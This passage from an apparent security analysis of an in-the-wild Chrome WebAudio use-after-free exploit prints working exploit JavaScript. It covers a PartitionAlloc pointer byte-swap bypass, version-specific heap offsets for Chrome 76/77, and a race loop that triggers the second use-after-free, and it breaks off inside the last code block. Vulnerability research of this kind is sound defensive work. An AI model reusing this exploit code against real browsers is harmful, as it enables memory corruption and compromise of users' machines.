This function is executed recursively. It fills the audio channel buffer with zeros, starts rendering offline and at the same time runs a loop that nullifies and resets the channel buffer of the ConvolverNode object and tries to trigger a bug. The exploit uses the later() function to simulate the Sleep function, suspend the current thread and let the Render and Audio threads finish execution right on time:</p>
		<div id="crayon-676241da675d6201746612" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function later(delay) {
	return new Promise(resolve =&gt; setTimeout(resolve, delay));
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675d6201746612-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d6201746612-2">2</div><div class="crayon-num" data-line="crayon-676241da675d6201746612-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675d6201746612-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">later</span><span class="crayon-sy">(</span><span class="crayon-i">delay</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d6201746612-2"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Promise</span><span class="crayon-sy">(</span><span class="crayon-i">resolve</span><span class="crayon-h"> </span>=<span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">setTimeout</span><span class="crayon-sy">(</span><span class="crayon-i">resolve</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">delay</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d6201746612-3"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
During execution the exploit checks if the audio channel buffer contains any data that differs from the previously set zeroes. The existence of such data would mean the UAF was triggered successfully and at this stage the audio channel buffer should contain a leaked pointer.</p>
<p>The PartitionAlloc memory allocator has a special exploit mitigation that works as follows: when the memory region is freed, it byteswaps the address of the pointer and after that the byteswapped address is added to the FreeList structure. This complicates exploitation because the attempt to dereference such a pointer will crash the process. To bypass this technique the exploit uses the following primitive that simply swaps the pointer back:</p>
		<div id="crayon-676241da675d8326657739" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function byteSwapBigInt(x) {
	let result = BigInt(0);
	let tmp = x;
 
	for (let i = 0; i &lt; 8; i++) {
    		result = result &lt;&lt; BigInt(8);
    		result += tmp &amp; BigInt(0xFF);
    		tmp = tmp &gt;&gt; BigInt(8);
	}
 
	return result;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675d8326657739-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d8326657739-2">2</div><div class="crayon-num" data-line="crayon-676241da675d8326657739-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d8326657739-4">4</div><div class="crayon-num" data-line="crayon-676241da675d8326657739-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d8326657739-6">6</div><div class="crayon-num" data-line="crayon-676241da675d8326657739-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d8326657739-8">8</div><div class="crayon-num" data-line="crayon-676241da675d8326657739-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d8326657739-10">10</div><div class="crayon-num" data-line="crayon-676241da675d8326657739-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d8326657739-12">12</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675d8326657739-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">byteSwapBigInt</span><span class="crayon-sy">(</span><span class="crayon-i">x</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d8326657739-2"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">result</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d8326657739-3"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">tmp</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">x</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d8326657739-4"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d8326657739-5"><span class="crayon-h">	</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">i</span>++<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d8326657739-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">result</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">result</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">8</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d8326657739-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">result</span><span class="crayon-h"> </span>+=<span class="crayon-h"> </span><span class="crayon-i">tmp</span><span class="crayon-h"> </span><span class="crayon-sy">&amp; BigInt(0xFF);</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d8326657739-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">tmp</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">tmp</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">8</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d8326657739-9"><span class="crayon-h">	</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d8326657739-10"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d8326657739-11"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">result</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d8326657739-12"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The exploit uses the leaked pointer to get the address of the SuperPage structure and verifies it. If everything goes to plan, then it should be a raw pointer to a temporary_buffer_ object of the ReverbConvolverStage class that is passed to the callback function <em>initialUAFCallback</em>.</p>
		<div id="crayon-676241da675d9529233156" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
let sharedAudioCtx;
let iirFilterFeedforwardAllocationPtr;
 
function initialUAFCallback(addr) {
	sharedAudioCtx = new OfflineAudioContext(1, 1, 3000);
 
	let partitionPageIndexDelta = undefined;
	switch (majorVersion) {
    		case 77: // 77.0.3865.75
        	 	partitionPageIndexDelta = BigInt(-26);
        	break;
    		case 76: // 76.0.3809.87
         		partitionPageIndexDelta = BigInt(-25);
      	   	break;
	}
 
	iirFilterFeedforwardAllocationPtr = getPartitionPageBaseWithinSuperPage(addr, getPartitionPageIndex(addr) + partitionPageIndexDelta) + BigInt(0xFF0);
 
    triggerSecondUAF(byteSwapBigInt(iirFilterFeedforwardAllocationPtr), finalUAFCallback);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675d9529233156-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-2">2</div><div class="crayon-num" data-line="crayon-676241da675d9529233156-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-4">4</div><div class="crayon-num" data-line="crayon-676241da675d9529233156-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-6">6</div><div class="crayon-num" data-line="crayon-676241da675d9529233156-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-8">8</div><div class="crayon-num" data-line="crayon-676241da675d9529233156-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-10">10</div><div class="crayon-num" data-line="crayon-676241da675d9529233156-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-12">12</div><div class="crayon-num" data-line="crayon-676241da675d9529233156-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-14">14</div><div class="crayon-num" data-line="crayon-676241da675d9529233156-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-16">16</div><div class="crayon-num" data-line="crayon-676241da675d9529233156-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-18">18</div><div class="crayon-num" data-line="crayon-676241da675d9529233156-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d9529233156-20">20</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675d9529233156-1"><span class="crayon-e">let </span><span class="crayon-i">sharedAudioCtx</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-2"><span class="crayon-e">let </span><span class="crayon-i">iirFilterFeedforwardAllocationPtr</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d9529233156-3"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-4"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">initialUAFCallback</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675d9529233156-5"><span class="crayon-h">	</span><span class="crayon-i">sharedAudioCtx</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">OfflineAudioContext</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-6"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d9529233156-7"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">partitionPageIndexDelta</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">undefined</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-8"><span class="crayon-h">	</span><span class="crayon-st">switch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">majorVersion</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675d9529233156-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-cn">77</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-c">// 77.0.3865.75</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	 	</span><span class="crayon-i">partitionPageIndexDelta</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span>-<span class="crayon-cn">26</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d9529233156-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">case</span><span class="crayon-h"> </span><span class="crayon-cn">76</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-c">// 76.0.3809.87</span></div><div class="crayon-line" id="crayon-676241da675d9529233156-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-i">partitionPageIndexDelta</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span>-<span class="crayon-cn">25</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	&nbsp;&nbsp; 	</span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d9529233156-15"><span class="crayon-h">	</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-16"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d9529233156-17"><span class="crayon-h">	</span><span class="crayon-i">iirFilterFeedforwardAllocationPtr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">getPartitionPageBaseWithinSuperPage</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">getPartitionPageIndex</span><span class="crayon-sy">(</span><span class="crayon-i">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-i">partitionPageIndexDelta</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0xFF0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-18"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d9529233156-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">triggerSecondUAF</span><span class="crayon-sy">(</span><span class="crayon-e">byteSwapBigInt</span><span class="crayon-sy">(</span><span class="crayon-i">iirFilterFeedforwardAllocationPtr</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">finalUAFCallback</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d9529233156-20"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The exploit uses the leaked pointer to get the address of the raw pointer to the <em>feedforward_</em> array with the AudioArray&lt;double&gt; type that is present in the IIRProcessor object created with IIRFilterNode. This array should be located in the same SuperPage, but in different versions of Chrome this object is created in different PartitionPages and there is a special code inside initialUAFCallback to handle that.</p>
<p>The vulnerability is actually triggered not once but twice. After the address of the right object is acquired, the vulnerability is exploited again. This time the exploit uses two AudioBuffer objects of different sizes, and the previously retrieved address is sprayed inside the larger AudioBuffer. This function also executes recursively.</p>
		<div id="crayon-676241da675da276939257" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
let floatArray = new Float32Array(10);
let audioBufferArray1 = [];
let audioBufferArray2 = [];
let imageDataArray = [];
 
async function triggerSecondUAF(addr, doneCb) {
	let counter = 0;
	let numChannels = 1;
 
	let audioCtx = new OfflineAudioContext(1, 0x100000, 48000);
 
	let bufferSource = audioCtx.createBufferSource();
	let convolver = audioCtx.createConvolver();
 
	let bigAudioBuffer = audioCtx.createBuffer(numChannels, 0x100, 48000);
	let smallAudioBuffer = audioCtx.createBuffer(numChannels, 0x2, 48000);
 
	smallAudioBuffer.getChannelData(0).fill(0);
 
	for (let i = 0; i &lt; numChannels; i++) {
    		let channelDataArray = new BigUint64Array(bigAudioBuffer.getChannelData(i).buffer);
    		channelDataArray[0] = addr;
	}
 
	bufferSource.buffer = bigAudioBuffer;
	convolver.buffer = smallAudioBuffer;
 
	bufferSource.loop = true;
	bufferSource.loopStart = 0;
	bufferSource.loopEnd = 1;
 
	bufferSource.connect(convolver);
	convolver.connect(audioCtx.destination);
 
	bufferSource.start();
 
	let finished = false;
 
     	audioCtx.startRendering().then(function(buffer) {
     		buffer = null;
 
    		if (finished) {
        		audioCtx = null;
 
        		setTimeout(doneCb, 200);
        		return;
    		} else {
        		finished = true;
 
        		setTimeout(function() {
             		triggerSecondUAF(addr, doneCb);
        		}, 1);
    		}
	});
 
	while (!finished) {
    		counter++;
 
    		convolver.buffer = null;
 
    		await later(1); // wait 1 millisecond
 
    		if (finished)
         		break;
 
    		for (let i = 0; i &lt; iirFilters.length; i++) {
        		floatArray.fill(0);
          	   iirFilters[i].getFrequencyResponse(floatArray, floatArray, floatArray);
 
         		if (floatArray[0] != 3.1415927410125732) {
             			finished = true;
 
             	     		audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));
                 		audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000));
 
            			bufferSource.disconnect();
            			convolver.disconnect();
 
            			return;
        		}
    		}
 
    		convolver.buffer = smallAudioBuffer;
 
    		await later(1); // wait 1 millisecond
	}
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675da276939257-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-2">2</div><div class="crayon-num" data-line="crayon-676241da675da276939257-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-4">4</div><div class="crayon-num" data-line="crayon-676241da675da276939257-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-6">6</div><div class="crayon-num" data-line="crayon-676241da675da276939257-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-8">8</div><div class="crayon-num" data-line="crayon-676241da675da276939257-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-10">10</div><div class="crayon-num" data-line="crayon-676241da675da276939257-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-12">12</div><div class="crayon-num" data-line="crayon-676241da675da276939257-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-14">14</div><div class="crayon-num" data-line="crayon-676241da675da276939257-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-16">16</div><div class="crayon-num" data-line="crayon-676241da675da276939257-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-18">18</div><div class="crayon-num" data-line="crayon-676241da675da276939257-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-20">20</div><div class="crayon-num" data-line="crayon-676241da675da276939257-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-22">22</div><div class="crayon-num" data-line="crayon-676241da675da276939257-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-24">24</div><div class="crayon-num" data-line="crayon-676241da675da276939257-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-26">26</div><div class="crayon-num" data-line="crayon-676241da675da276939257-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-28">28</div><div class="crayon-num" data-line="crayon-676241da675da276939257-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-30">30</div><div class="crayon-num" data-line="crayon-676241da675da276939257-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-32">32</div><div class="crayon-num" data-line="crayon-676241da675da276939257-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-34">34</div><div class="crayon-num" data-line="crayon-676241da675da276939257-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-36">36</div><div class="crayon-num" data-line="crayon-676241da675da276939257-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-38">38</div><div class="crayon-num" data-line="crayon-676241da675da276939257-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-40">40</div><div class="crayon-num" data-line="crayon-676241da675da276939257-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-42">42</div><div class="crayon-num" data-line="crayon-676241da675da276939257-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-44">44</div><div class="crayon-num" data-line="crayon-676241da675da276939257-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-46">46</div><div class="crayon-num" data-line="crayon-676241da675da276939257-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-48">48</div><div class="crayon-num" data-line="crayon-676241da675da276939257-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-50">50</div><div class="crayon-num" data-line="crayon-676241da675da276939257-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-52">52</div><div class="crayon-num" data-line="crayon-676241da675da276939257-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-54">54</div><div class="crayon-num" data-line="crayon-676241da675da276939257-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-56">56</div><div class="crayon-num" data-line="crayon-676241da675da276939257-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-58">58</div><div class="crayon-num" data-line="crayon-676241da675da276939257-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-60">60</div><div class="crayon-num" data-line="crayon-676241da675da276939257-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-62">62</div><div class="crayon-num" data-line="crayon-676241da675da276939257-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-64">64</div><div class="crayon-num" data-line="crayon-676241da675da276939257-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-66">66</div><div class="crayon-num" data-line="crayon-676241da675da276939257-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-68">68</div><div class="crayon-num" data-line="crayon-676241da675da276939257-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-70">70</div><div class="crayon-num" data-line="crayon-676241da675da276939257-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-72">72</div><div class="crayon-num" data-line="crayon-676241da675da276939257-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-74">74</div><div class="crayon-num" data-line="crayon-676241da675da276939257-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675da276939257-76">76</div><div class="crayon-num" data-line="crayon-676241da675da276939257-77">77</div><div 